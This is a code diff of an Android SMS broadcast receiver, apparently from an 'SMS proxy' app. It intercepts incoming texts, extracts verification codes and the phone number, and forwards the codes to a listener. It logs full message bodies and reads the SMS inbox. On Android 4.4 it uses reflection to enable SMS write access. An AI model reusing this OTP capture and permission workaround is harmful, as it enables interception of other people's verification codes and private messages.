@@ -5,7 +5,6 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.content.SharedPreferences;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
@@ -14,10 +13,7 @@ import android.telephony.SmsMessage;
 import android.text.TextUtils;
 import android.util.Log;
 
-import com.android.sms.proxy.entity.MessageEvent;
 import com.android.sms.proxy.entity.PhoneInfo;
-
-import org.greenrobot.eventbus.EventBus;
 
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -39,21 +35,27 @@ public class Receiver_SMS extends BroadcastReceiver {
 	private final String SMS_RECEIVE_CONTENT = "content://sms/inbox";
 	private final String SMS_CONTENT = "content://sms";
 
-
-	private OnReceiveSMSListener mOnReceiveSMSListener;
+	private static OnReceiveSMSListener mOnReceiveSMSListener;
 
 	public Receiver_SMS() {
-	};
+	}
+
+	;
 
 	public Receiver_SMS(OnReceiveSMSListener listener) {
 		mOnReceiveSMSListener = listener;
 	}
+
 
 	public static void registSmsReceiver(Context context, Receiver_SMS receiver) {
 		IntentFilter filter = new IntentFilter();
 		filter.addAction(SMS_ACTION);
 		filter.addCategory(SMS_CATEGORY);
 		context.registerReceiver(receiver, filter);
+	}
+
+	public static void setReceiveListener(OnReceiveSMSListener listener) {
+		mOnReceiveSMSListener = listener;
 	}
 
 	public static void unRegisterSmsReceiver(Context context, Receiver_SMS reciever) {
@@ -76,9 +78,7 @@ public class Receiver_SMS extends BroadcastReceiver {
 					Object[] pdus = (Object[]) args.get(SMS_SERVICE);
 					SmsMessage messages[] = new SmsMessage[pdus.length];
 					boolean hasPhoneNumber = true;
-					SharedPreferences sp = context.getSharedPreferences(PhoneInfo.SP_TABLE_PHONE_INFO, Context
-							.MODE_PRIVATE);
-					String phoneNumber = sp.getString(PhoneInfo.SP_KEY_PHONE_NUMBER, "");
+					String phoneNumber = PhoneInfo.getInstance(context).getDbPhoneNumber(context);
 					if (TextUtils.isEmpty(phoneNumber)) {
 						hasPhoneNumber = false;
 					}
@@ -88,31 +88,25 @@ public class Receiver_SMS extends BroadcastReceiver {
 
 						//final String verifyCode = getVerificationCode(msgContent);
 						if (!hasPhoneNumber) {
-							String number = getPhoneNumber(msgContent);
+							final String number = getPhoneNumber(msgContent);
 							Log.d(TAG, "已经找到该手机号:" + number);
 							if (!TextUtils.isEmpty(number)) {
 								hasPhoneNumber = true;
-								SharedPreferences.Editor et = sp.edit();
-								et.putString(PhoneInfo.SP_KEY_PHONE_NUMBER, number);
-								boolean save = et.commit();
-								if (save) {
-									Log.d(TAG, "手机号已保存成功");
-									PhoneInfo.phoneNumber = number;
-									break;
-								}
+								PhoneInfo.getInstance(context).insertPhone(context, number);
 							}
 						}
 						if (msgContent != null) {
+							Log.d(TAG, "收到的短信内容：" + msgContent);
 							String code = getVerificationCode(msgContent);
 							Log.d(TAG, "验证码是" + code);
-							String printMessage = "验证码是:"+msgContent;
-							EventBus.getDefault().post(new MessageEvent(printMessage));
-							if(!TextUtils.isEmpty(code)){
-								if(mOnReceiveSMSListener != null){
+							if (TextUtils.isEmpty(code)) return;
+							if (!TextUtils.isEmpty(code)) {
+								if (mOnReceiveSMSListener != null) {
 									mOnReceiveSMSListener.onReceiveSMS(code);
 								}
 								if (Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT) {
 									if (SmsWriteOpUtil.isWriteEnabled(context)) {
+										Log.d(TAG, "4.4反射修改短信权限！！！！！！");
 										SmsWriteOpUtil.setWriteEnabled(context, true);
 									}
 								}
@@ -171,7 +165,6 @@ public class Receiver_SMS extends BroadcastReceiver {
 			ContentResolver contentResolver = context.getContentResolver();
 			if (contentResolver != null) {
 				Cursor isRead = contentResolver.query(uri, null, null, null, null);
-				Log.d(TAG, "找到类似的短信多少条:" + isRead.getCount());
 				while (isRead.moveToNext()) {
 					String body = isRead.getString(isRead.getColumnIndex(SMS_BODY)).trim();
 					Log.d(TAG, "短信内容:" + body);
